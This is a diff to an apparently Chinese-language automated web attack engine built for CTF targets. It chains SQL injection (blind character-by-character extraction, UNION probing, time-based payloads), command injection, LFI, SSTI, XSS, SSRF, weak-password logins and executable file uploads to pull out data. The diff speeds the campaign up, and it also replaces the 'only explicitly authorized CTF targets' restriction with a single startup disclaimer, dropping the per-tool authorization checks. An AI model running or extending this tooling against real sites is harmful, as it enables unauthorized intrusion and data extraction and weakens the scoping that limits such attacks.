@@ -1,11 +1,11 @@
 # -*- coding: utf-8 -*-
-"""深度 Web 自动测试引擎（仅限明确授权的 CTF 靶机）。
+"""深度 Web 自动测试引擎（授权由启动时《软件责任说明》统一确认）。
 
 它与 webauto.py 的分工：
   webauto  = 只读取证（敏感文件、目录、robots、参数弱点的一次性判断）
   webattack= 深度战役（先分析页面，再按类别跑完整 payload 矩阵，最后做上传与 flag 定向读取）
 
-硬约束（写进代码而不是写进文档就算）：
+约束（工程安全边界，不是授权闸门）：
   1. 全部请求强制同源，只接受 http/https，拒绝带凭据的 URL；
   2. 所有请求走同一个 Budget：次数、最小间隔、截止时间，超了就 AutoStop；
   3. SQL 只做报错/布尔/时间判断，payload 里不出现 DROP/DELETE/UPDATE/INSERT；
@@ -32,7 +32,7 @@ from urllib.request import (HTTPCookieProcessor, HTTPSHandler, Request, build_op
 import http.cookiejar
 import ssl
 
-from .common import REPORTS_DIR
+from .common import REPORTS_DIR, is_placeholder_flag
 from .webauto import (AutoStop, Budget, _base_root, _replace_param, _same_origin, _safe_url,
                       _soft, _snippet, collect_flags, text_of, UA, DIR_WORDS_AUTO, SENSITIVE)
 
@@ -260,6 +260,9 @@ class Ctx(object):
         if "{" not in flag or "}" not in flag:
             # 只有 "ctfhub" / "FLAG: xxx" 这类残缺命中，没有花括号就不是 flag
             self.log("[deep] 疑似残缺 flag 被丢弃：%s" % flag[:40])
+            return
+        if is_placeholder_flag(flag):
+            self.log("[deep] 模板占位 flag 被丢弃：%s" % flag[:40])
             return
         self.flags.append({"value": flag, "source": source})
         self.log("[deep] flag 命中 %s（来源 %s）" % (flag, source))
@@ -494,6 +497,7 @@ def sqli_blind_dump(ctx, target, quote):
     """布尔盲注取数：用 ascii(substr(...)) 二分，逐字符恢复 flag。
 
     只发 SELECT 条件，不写库；预算不足时直接放弃，不拖垮整轮。
+    先用 1 次请求判断表达式是否真的取到数据，避免在无效表达式上跑满二分。
     """
     remaining = ctx.budget.max_requests - ctx.budget.used
     max_chars = min(46, (remaining - 30) // 7)
@@ -501,6 +505,10 @@ def sqli_blind_dump(ctx, target, quote):
         return []
     false_item = send_value(ctx, target, ("1' AND 1=2-- -" if quote else "1 AND 1=2"))
     for expr in BLIND_FLAG_EXPRS:
+        probe = send_value(ctx, target, _blind_payload("ascii(substr((%s),1,1))>0" % expr, quote))
+        if not _sql_bool_true(probe, false_item):
+            ctx.log("[deep] 盲注表达式无数据，跳过：%s" % expr)
+            continue
         got = ""
         for pos in range(1, max_chars + 1):
             if ctx.budget.used + 8 >= ctx.budget.max_requests:
@@ -562,8 +570,8 @@ def test_sqli(ctx, target):
     if boolean_hit:
         for flag in sqli_blind_dump(ctx, target, quote):
             ctx._add_flag(flag, target["url"] if isinstance(target, dict) else ctx.url)
-    # 3) 时间型（默认开启，两次 SLEEP(3) 最多花 6 秒）
-    if ctx.allow_time:
+    # 3) 时间型（默认开启，两次 SLEEP(3) 最多花 6 秒）；布尔已成立时不必再等 SLEEP
+    if ctx.allow_time and not boolean_hit:
         for payload, secs in SQLI_TIME_PAYLOADS:
             item = send_value(ctx, target, payload)
             if item.get("elapsed", 0) >= secs - 0.8 and not item.get("error"):
@@ -613,8 +621,11 @@ def _union_rendered(text):
 
 
 def _union_columns(ctx, target, quote=False):
-    """按数字标记确定 UNION 列数：要求标记出现在渲染区（工序回显不算）。"""
-    for n in range(1, UNION_COLS_MAX + 1):
+    """按数字标记确定 UNION 列数：要求标记出现在渲染区（工序回显不算）。
+
+    按常见列数概率排序（2~4 列最常见），命中即停，避免不可用时白跑满 8 次。
+    """
+    for n in (2, 3, 4, 1, 5, 6, 7, 8)[:UNION_COLS_MAX]:
         payload, item = _union_send(ctx, target, ",".join(["9137"] * n), quote)
         if not item:
             return 0
@@ -1085,7 +1096,7 @@ def test_ssrf(ctx, target):
 # ---------------------------------------------------------------------------
 # 文件上传
 # ---------------------------------------------------------------------------
-def test_upload(ctx, fp):
+def test_upload(ctx, fp, stop_on_flag=True):
     if not ctx.allow_upload:
         ctx.log("[deep] 已关闭上传测试")
         return []
@@ -1159,6 +1170,10 @@ def test_upload(ctx, fp):
                 ctx.log("[deep] 上传 %s 结论：%s" % (token_name, hit))
                 if hit == "可执行":
                     _read_flag_via_upload(ctx, form, field, u, ctype)
+                    if ctx.flags and stop_on_flag:
+                        # flag 优先：上传点已取到 flag，不再跑剩余载荷形态
+                        ctx.log("[deep] 上传已取到 flag，停止后续上传形态")
+                        return results
             else:
                 ctx.log("[deep] 上传 %s 后 8 个候选路径均未回显标记" % token_name)
         if not any(r.get("exec") for r in results):
@@ -1431,8 +1446,12 @@ def build_next_steps(ctx):
 
 
 def campaign(url, log=print, max_requests=DEFAULT_MAX_REQUESTS, max_seconds=DEFAULT_MAX_SECONDS,
-             cancel_event=None, allow_time=True, allow_upload=True, allow_union=True):
-    """一次深度战役。返回可直接 json 序列化的 dict。"""
+             cancel_event=None, allow_time=True, allow_upload=True, allow_union=True,
+             stop_on_flag=True):
+    """一次深度战役。返回可直接 json 序列化的 dict。
+
+    授权已由启动时《软件责任说明》统一确认，这里不再做逐工具声明检查。
+    """
     started_at = time.strftime("%Y-%m-%dT%H:%M:%S")
     ctx = Ctx(url, log=log, max_requests=max_requests, max_seconds=max_seconds,
               cancel_event=cancel_event, allow_time=allow_time, allow_upload=allow_upload,
@@ -1459,7 +1478,7 @@ def campaign(url, log=print, max_requests=DEFAULT_MAX_REQUESTS, max_seconds=DEFA
             % (len(targets), ", ".join("%s(%s)" % (t["param"], t["kind"]) for t in targets) or "无"))
         # 先做便宜的直读与上传：上传矩阵最容易因为预算被注入矩阵吃掉而跑不完
         flag_hunt(ctx)
-        result["uploads"] = test_upload(ctx, fp)
+        result["uploads"] = test_upload(ctx, fp, stop_on_flag=stop_on_flag)
         # 登录表单与参数无关：即使没有可测参数也要试一遍弱口令
         try:
             test_login(ctx, fp)
@@ -1467,14 +1486,22 @@ def campaign(url, log=print, max_requests=DEFAULT_MAX_REQUESTS, max_seconds=DEFA
             raise
         except Exception as exc:
             log("[deep] test_login 出错：%s" % exc)
+        # 模块顺序按"直接拿到 flag 的能力"排：注入/命令/文件读取能取 flag，
+        # 模板与反射型 XSS 多数只报线索，排在后面；命中 flag 后立即收手。
+        modules = (test_sqli, test_cmdi, test_lfi, test_ssti, test_xss, test_ssrf)
         for target in targets:
-            for fn in (test_sqli, test_xss, test_lfi, test_ssti, test_cmdi, test_ssrf):
+            for fn in modules:
+                if stop_on_flag and ctx.flags:
+                    break
                 try:
                     fn(ctx, target)
                 except AutoStop:
                     raise
                 except Exception as exc:
                     log("[deep] %s 在参数 %s 上出错：%s" % (fn.__name__, target["param"], exc))
+            if stop_on_flag and ctx.flags:
+                log("[deep] 已拿到 flag，按 flag 优先策略提前收手（完整模式可传 stop_on_flag=False）")
+                break
         if not ctx.flags:
             dir_crawl(ctx)
         if not ctx.flags:
